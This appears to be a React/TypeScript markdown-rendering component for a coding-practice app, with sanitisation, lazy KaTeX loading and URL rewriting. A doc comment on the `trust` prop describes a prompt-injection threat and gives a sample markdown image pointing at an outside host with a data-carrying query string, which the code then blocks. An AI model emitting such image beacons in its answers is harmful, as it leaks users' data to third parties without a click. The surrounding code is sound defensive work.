import { memo, useEffect, useState, type ComponentProps } from 'react';
import ReactMarkdown, { defaultUrlTransform, type ExtraProps } from 'react-markdown';
import rehypeSanitize from 'rehype-sanitize';
import remarkGfm from 'remark-gfm';
import { rehypeHighlight } from './highlight.js';
import { sanitizeOptions } from './sanitize.js';

/**
 * The statement renderer (ROADMAP P4-3).
 *
 * Every piece of markdown the app shows - statements, editorials, hints, coach
 * feedback later - goes through this one component, so "how does a table look"
 * and "what is a fenced block allowed to contain" have one answer.
 *
 * Markdown becomes React elements; there is no `dangerouslySetInnerHTML` and no
 * `rehype-raw`, so raw HTML in a statement is inert before the sanitiser is even
 * asked. The sanitiser is the second lock (see `sanitize.ts`).
 *
 * Plugin order is load-bearing: sanitise first, then the two plugins that
 * *generate* markup. KaTeX and the highlighter emit elements with class names
 * the schema does not list, and sanitising after them would strip exactly the
 * output they exist to produce.
 */

/** Whatever `react-markdown` accepts, without reaching into `unified` for the type. */
type PluginList = NonNullable<ComponentProps<typeof ReactMarkdown>['rehypePlugins']>;

const SANITIZE: PluginList[number] = [rehypeSanitize, sanitizeOptions];
const REMARK_PLUGINS: PluginList = [remarkGfm];
const REHYPE_PLUGINS: PluginList = [SANITIZE, rehypeHighlight];

/**
 * Whether this text is worth loading KaTeX for.
 *
 * KaTeX and its fonts are around 300 KB, no problem statement in the catalogue
 * uses maths, and the ones that eventually do will be a handful - so the parser
 * is fetched on demand rather than shipped to everyone (D16's bundle discipline,
 * the same reason Monaco carries two tokenizers).
 *
 * A dollar sign with a non-space next to it. Prices in a statement ("$5") match
 * too, which costs a chunk nobody reads; the reverse mistake - missing real
 * maths and rendering it as literal dollars - would be visible on screen.
 */
function looksLikeMath(source: string): boolean {
  return /\$\$[\s\S]+?\$\$|\$[^\s$][^$\n]*\$/.test(source);
}

interface MathPlugins {
  remark: PluginList[number];
  rehype: PluginList[number];
}

function useMathPlugins(source: string): MathPlugins | null {
  const wanted = looksLikeMath(source);
  const [plugins, setPlugins] = useState<MathPlugins | null>(null);

  useEffect(() => {
    if (!wanted || plugins) return;
    let cancelled = false;

    void (async () => {
      try {
        const [remark, rehype] = await Promise.all([
          import('remark-math'),
          import('rehype-katex'),
          // KaTeX ships its own stylesheet and fonts; without it the markup
          // renders as a pile of unpositioned spans.
          import('katex/dist/katex.min.css'),
        ]);
        if (!cancelled) setPlugins({ remark: remark.default, rehype: rehype.default });
      } catch {
        // The maths stays as the text the author typed, which is legible if not
        // pretty. Failing to render the whole statement would not be.
      }
    })();

    return () => {
      cancelled = true;
    };
  }, [wanted, plugins]);

  return wanted ? plugins : null;
}

export interface MarkdownProps {
  content: string;
  /**
   * The problem whose `assets/` directory relative image paths resolve against.
   * Omitted for markdown that has no assets of its own (a hint, coach feedback).
   */
  assetSlug?: string;
  /**
   * Where this markdown came from (ROADMAP P5-10).
   *
   * `repo` is content we wrote - statements, hints, editorials - and may embed
   * images from its own `assets/` directory.
   *
   * `coach` is a model's answer, which is influenced by the code in the editor
   * and by the problem text. `rehype-sanitize` allows any `img src`, so an
   * injected `![](https://elsewhere/x.png?c=...)` would make the browser fetch
   * a URL of someone else's choosing the moment the answer painted - a beacon
   * that needs no click. Images in coach content are therefore dropped unless
   * they point at this app's own assets route.
   */
  trust?: 'repo' | 'coach';
  className?: string;
}

/*
 * `node` is taken out of both overrides below (ROADMAP P4-15). react-markdown
 * hands every custom component the hast node it came from, and spreading the
 * rest of the props onto the DOM element wrote `node="[object Object]"` onto
 * every link and image - and React warned about it on every render.
 */

function anchor({ href, children, node: _node, ...props }: ComponentProps<'a'> & ExtraProps) {
  const external = href !== undefined && /^https?:/i.test(href);
  return (
    <a
      href={href}
      // A statement that links out is linking to a spec or a paper. Opening it
      // over the workspace would lose the editor's contents.
      {...(external ? { target: '_blank', rel: 'noreferrer noopener' } : {})}
      {...props}
    >
      {children}
    </a>
  );
}

function image({ alt, node: _node, ...props }: ComponentProps<'img'> & ExtraProps) {
  // `alt` is required by the markdown syntax but may be empty; jsx-a11y wants it
  // present either way, and an empty one correctly marks a decorative figure.
  return <img alt={alt ?? ''} loading="lazy" {...props} />;
}

const COMPONENTS = { a: anchor, img: image };

/** The one URL prefix coach content may load an image from. */
const ASSETS_PREFIX = '/api/problems/';

function MarkdownContent({ content, assetSlug, trust = 'repo', className }: MarkdownProps) {
  const math = useMathPlugins(content);

  const remarkPlugins = math ? [...REMARK_PLUGINS, math.remark] : REMARK_PLUGINS;
  // KaTeX goes between the sanitiser and the highlighter: after the first so
  // its markup survives, before the second so a fenced block is still code.
  const rehypePlugins = math ? [SANITIZE, math.rehype, rehypeHighlight] : REHYPE_PLUGINS;

  return (
    <div className={className ? `md-prose ${className}` : 'md-prose'}>
      <ReactMarkdown
        remarkPlugins={remarkPlugins}
        rehypePlugins={rehypePlugins}
        components={COMPONENTS}
        urlTransform={(url, key) => {
          const safe = defaultUrlTransform(url);

          // An image in a model's answer may only come from this app (P5-10).
          // Links are left alone: a link is a thing the user chooses to follow
          // and can read before they do.
          if (trust === 'coach' && key === 'src' && !safe.startsWith(ASSETS_PREFIX)) {
            return '';
          }

          if (!safe || assetSlug === undefined) return safe;
          // Absolute, root-relative and in-page links are already addresses.
          // Anything else is a file next to the statement, and the only route
          // that will serve those is the assets one (P3-1).
          if (/^[a-z][a-z\d+.-]*:/i.test(safe) || safe.startsWith('/') || safe.startsWith('#')) {
            return safe;
          }
          return `/api/problems/${encodeURIComponent(assetSlug)}/assets/${safe}`;
        }}
      >
        {content}
      </ReactMarkdown>
    </div>
  );
}

/**
 * Memoised on its props (ROADMAP P4-13).
 *
 * Every keystroke in the editor re-renders the workspace, and parsing markdown
 * is remark, rehype, the sanitiser and the highlighter - so the statement, the
 * hints, the editorial and every coach turn were re-parsed on each character
 * typed. None of those change while someone types code, and the props are
 * strings: a shallow comparison is exactly the right test.
 */
export const Markdown = memo(MarkdownContent);
